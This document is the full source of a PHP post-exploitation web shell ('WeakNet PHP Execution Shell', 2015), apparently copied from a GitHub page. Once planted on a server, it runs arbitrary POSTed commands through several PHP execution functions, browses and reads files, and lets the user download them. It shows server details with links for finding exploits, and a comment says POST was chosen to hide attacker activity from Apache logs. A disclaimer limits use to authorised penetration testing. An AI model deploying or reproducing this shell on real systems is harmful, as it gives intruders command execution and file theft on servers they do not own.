<!DOCTYPE html>
<html>
<!--
	WeakNet PHP Execution Shell - Post-exploitation shell for convenience
	with navigation, and file content showing capabilities
	version 0.2
	2015 - Written by Douglas WeakNetLabs@Gmail.com
-->
<head>
<title>Weakerthan PHP Exec Shell - 2015 WeakNet Labs</title>
<style>
	html{ /* global styling */
		font-family:"Open Sans", sans-serif;
		background-color:#3c3c3c;
		color:#729fcf;
	}
	.inputCMD{ /* input parent box at the bottom */
		border-top:3px solid #666;
		position:fixed;
		bottom:0px;
		left:0px;
		width:100%;
		padding:20px 0px 20px 10px;
		background:#262626;
	}
	.cmdTitle{ /* a simple span to differentiate the command from the title */
		font-size:14px;
		color:yellow;
		font-family:monospace;
	}
	input[type=text]{ /* making input look a bit more modern */
		font-size:15px;
		background-color:#353535;
		color:yellow;
		padding:10px;
		border:2px solid #2e2e2e;
		float:left;
		margin:5px 0px 0px 0px;
		transition-property: background-color;
		transition-duration: 2s;
	}
	input[type=text]:hover{ /* making input look a bit more modern */
		background-color:#545454;
	}
	.titleBar{ /* this parent div is positioned */
		position:fixed; 
		top:0px;
		left:0px;
		width:100%;
		height:50px;
		background:#2a2a2a;
		border-bottom:3px solid #666;
		padding-bottom:5px;
	}
	.title{ /* this div is to vertically center the child, titleCenter */
		display: table-cell;
		vertical-align: middle;
		padding:10px 0px 10px 10px;
	}
	.titleCenter{ /* vertically centered in middle of ".title" */
		height:25px;
		margin:auto;
		display: inline-block;
	}
	.output{ /* command output box with scolled overlfow */
		font-family: monospace;
		font-size:14px;
		margin:70px 0px 0px 0px;
		overflow:scrolled;
		padding: 5px 5px 150px 5px; /* to show command output behind the inputCMD bar */
		color:#ccc;
		background-color:#565656;
		width:74%;
	}
	.unicode{ /* display a pointer on hover */
		cursor:pointer;
	}
	.serverInfo{ /* for small box on top right for server information */
		border:2px solid #666;
		position:fixed;
		top:10px;
		right:10px;
		z-index:1337;
		background:#2e2e2e;
		color:#729fcf;
		padding:5px;
		font-size:14px;
	}
	.branding{ /* for a link to the GitHUB page */
		float:right;
		font-size:15px;
		margin-right:20px;
		height:40px; /* because of padding t,b of inputCMD */
	}
	a{ /* why can't this be non hideous by default? */
		text-decoration:none;
		color:#729fcf;
	}
	a:hover{
		text-decoration:underline; /* to differentiate, i guess */
	}
	button{
		margin:5px 0px 0px 10px;
		color:#729fcf;
		padding:10px;
		background-color:#353535;
		border:2px solid #2e2e2e;
		float:left;
		transition-property: background-color;
		transition-duration: 2s;
	}
	button:hover{
		background-color:#545454;
	}
	/* these are for styling the tbale output of the .serverInfo box: */
	tr:nth-child(even) {background: #202020}
	tr:nth-child(odd) {background: #343434}
	td{ padding:3px;}
</style>
<script>
	// for dynamically generating navigation from output
	function submitFile(path,file,action){
		if(action == "cat"){
			document.getElementById("inputCmd").value='cat ' + path + file; // TODO change to while read foo do echo foo
		}else if(action == "ls"){
			document.getElementById("inputCmd").value='ls -l ' + path + file; // TODO change to while read foo do echo foo
		}
		document.getElementById("submitCmd").submit(); // submit the request
	}
	function execType(type){
		document.getElementById('execType').value=type; // Just set the type here and the PHP POST will pick it up
	}
</script>
</head>
<body>
<?php
	if (!$_POST['cmd']) { # initial hit to the page
		$cmd = "(none) Please type a command to execute below";
		$output = "WeakNet Post-Exploitation PHP Execution Shell is free, redistributable software. It has no warranty for the program, "
			."to the extent permitted by applicable law. WeakNet Laboratories is no liable to you for damages, including any general,"
			." special, incidental or consequential damages arising out of the use or inability to use the program. <br /><br />This"
			." program should only be used on systems that the penetration tester has permission to use or owns."
			."<br /><br />To begin, please type a command below. For help please refer to the GitHUB Readme.md file by clicking on the"
			." link on the bottom left. Thank you for choosing WeakNet Labs!";
	}else{
		$cmd = $_POST['cmd']; # reassign is easier to read
		if($_POST['execType'] == "exec"){ 
			exec("$cmd 2>/dev/stdout",$results); # a command, let's execute it on the host
		}elseif($_POST['execType'] == "system"){ 
			system("$cmd 2>/dev/stdout",$results); # use system() in case exec() was disabled in PHP.ini
		}elseif($_POST['execType'] == "passthru"){
			passthru("$cmd 2>/dev/stdout",$results); # use passthru for command execution/injection
		}elseif($_POST['execType'] =="shell_exec"){
			$results = shell_exec("$cmd 2>/dev/stdout"); # use shell_exec (similar to backtick operators, or $() in Bash)
		}
	}
	echo "<div class=\"titleBar\"><div class=\"title\"><div class=\"titleCenter\"><span style=\"font-size:35px;\">&#128026; WPES</span> Displaying results for command: ".
		" <span class=\"cmdTitle\">".$cmd."</span></div></div></div>";
?>
<!-- This is where the outpu of the command goes -->
<div class="output">
<?php
	if($_POST['cmd']){ # a command was passed, parse output:
		foreach(array_slice($results,1,count($results)) as $output) { # let's format the output, in case it contains HTML characters:
			$raw = implode ('\n',$results); # save the raw form for downloading
			$exploded = explode(" ", $output);
			$file = array_pop($exploded);
			$path = preg_replace("/.*\s([^ ]+)$/","$1","$cmd"); # get full path
			if(!preg_match("/\/$/","$path")){ # add a fwd slash:
				$path .= "/";
			} # now we can style the regular file output:
			$output = preg_replace("/&/","&amp;",$output); # replace all ampersands
			$output = preg_replace("/</","&lt;",$output); # replace all less thanh (open HTML tag brackets)
			$output = preg_replace("/\s/","&nbsp;",$output); # replace all whitespace
			if(preg_match("/^ls -l\s/","$cmd")){ # is this an ls command?
				if(!preg_match("/^d/","$output")){
					echo "<span style=\"color:yellow\" title=\"Click here view file contents\" class=\"unicode\" onClick=\"submitFile('$path','$file','cat');\">&#128049;</span>&nbsp;".$output."<br />";
				}else{
	    				echo "<span style=\"color:#00ce05\" title=\"Click here to view directory contents\" class=\"unicode\" onClick=\"submitFile('$path','$file','ls');\">&#128269;</span>&nbsp;".$output."<br />";
				}
			}else{
	    			echo $output."<br />";
			}
		}
	}else{
		echo $output."<br />"; # dump message
	}
?>
<script>
	// this is seemingly randomly placement, but I am using PHP to write the file contents that I need to retrieve first
	function saveFile(){
		window.open('data:text/plain;charset=utf-8,' + escape('<?php $contents = preg_replace("/(\(|\)|\$|')/","$1",$raw); echo $contents; ?>'));
	}
</script>
<!-- Download the file -->
<?php
	if($_POST['downloadFile']){ # pass download, by clicking on the download button
		if($_POST['downloadFile'] == 1){ # 0 for non download 1 for download
			$abspath = $path . $file; # 	create an absolute path to the file
			if (file_exists($abspath)) { # does the file exist?
				header('Content-Description: File Transfer');
				header('Content-Type: application/octet-stream');
				header('Content-Disposition: attachment; filename="'.basename($abspath).'.txt"');
				header('Expires: 0');
				header('Cache-Control: must-revalidate');
				header('Pragma: public');
				header('Content-Length: ' . filesize($abspath));
				readfile($abspath);
			}
		}
	}
?>
</div>
<!-- The input box and whole bottom bar -->
<div class="inputCMD">
	<strong>PHP Exec Function: </strong> 
		<a href="http://php.net/manual/en/function.exec.php">exec()</a><input type="radio" <?php if(!$_POST['execType']){echo "checked"; }else{if($_POST['execType'] == "exec"){echo "checked";} } ?> 
			name="execType" value="exec" onClick="execType('exec')"/> 
		<a href="http://php.net/manual/en/function.system.php">system()</a><input onClick="execType('system')" <?php if($_POST['execType']){if($_POST['execType'] == "system"){echo "checked";} } ?> 
			type="radio" name="execType" value="system" /> 
		<a href="http://php.net/manual/en/function.passthru.php">passthru()</a><input onClick="execType('passthru')" <?php if($_POST['execType']){if($_POST['execType'] == "passthru"){echo "checked";} } ?>
			type="radio" name="execType" value="passthru" />
		<a href="http://php.net/manual/en/function.shell-exec.php">shell_exec()</a><input onClick="execType('shell_exec')" <?php if($_POST['execType']){if($_POST['execType'] == "shell_exec"){echo "checked";} } ?>
			type="radio" name="execType" value="shell_exec" /><br />
	<form action="#" method="post" name="submitCmd" id="submitCmd"><!-- no button here, just hit enter -->
		<input id="inputCmd" type="text" size="55" placeholder="Type command here to execute on host and hit return" name="cmd"/>
		<input type="hidden" value="<?php if($_POST['execType'] != ""){echo $_POST['execType'];}else{echo "exec";} ?>" name="execType" id="execType"/>
		<button type="button" onClick="saveFile();">Download File</button>
	</form><!-- went with POST method to slightly obfuscate the attacker's activity from simple Apache logs -->
<!-- The band name on the bottom left -->
<div class="branding">
	<a href="https://github.com/weaknetlabs/wpes">&#128026; WPES WeakNet Labs</a>
</div>
<!-- The Server info box -->
<div class="serverInfo">
	<table>
		<tr><strong style="font-size:16px;">&#128225; Remote Server Information &#128225;</strong></tr>
		<tr><td>IP</td><td><?php echo "<a title=\"Check ARIN database for this IP address information.\" target=\"_blank\" href=\"http://whois.arin.net/rest/nets;q=".$_SERVER['SERVER_ADDR']
			."?showDetails=true&showARIN=false&showNonArinTopLevelNet=false&ext=netref2\">"
			.$_SERVER['SERVER_ADDR']."</a>"; ?>
		</td</tr>
		<?php # let's create an exploit-db search link
			$software = preg_replace("/\//","%20",$_SERVER['SERVER_SOFTWARE']); # get rid of fwd slashes
			$software = preg_replace("/\([^)]+\)/","",$software); # get rid of OS version
		?>
		<tr><td>Hostname</td><td><?php echo "<a target=\"blank\" href=\"https://www.google.com/?gws_rd=ssl#q=site:".$_SERVER['SERVER_NAME']."\">".$_SERVER['SERVER_NAME']."</a>"; ?></td</tr>
		<tr><td>Software</td><td><?php echo "<a target=\"blank\" title=\"Check for exploits for this software using Exploit-DB.\" href=\"https://www.exploit-db.com/search/?action=search&description=".$software."&e_author=\">".$_SERVER['SERVER_SOFTWARE']."</a>"; ?></td</tr>
		<tr><td>Timestamp</td><td><?php echo $_SERVER['REQUEST_TIME']; ?></td</tr>
		<tr><td>Admin</td><td><?php echo "<a target=\"_blank\" title=\"Email administrator.\" href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" ?></td</tr>
	</table>
</div>
</body>
</html>
Status API Training Shop Blog About Pricing
© 2015 GitHub, Inc. Terms Privacy Security Contact Help
